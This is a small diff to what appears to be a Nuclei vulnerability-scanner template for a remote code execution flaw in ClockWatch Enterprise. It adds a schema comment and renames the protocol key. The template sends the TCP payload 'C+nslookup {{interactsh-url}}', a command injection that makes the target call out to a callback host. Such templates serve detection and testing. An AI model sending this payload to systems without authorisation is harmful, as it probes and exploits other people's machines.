@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: clockwatch-enterprise-rce
 
 info:
@@ -8,7 +9,7 @@ info:
     - https://blog.grimm-co.com/2021/07/old-dog-same-tricks.html
   tags: clockwatch,rce,network
 
-network:
+tcp:
   - inputs:
       - data: "C+nslookup {{interactsh-url}}"
 
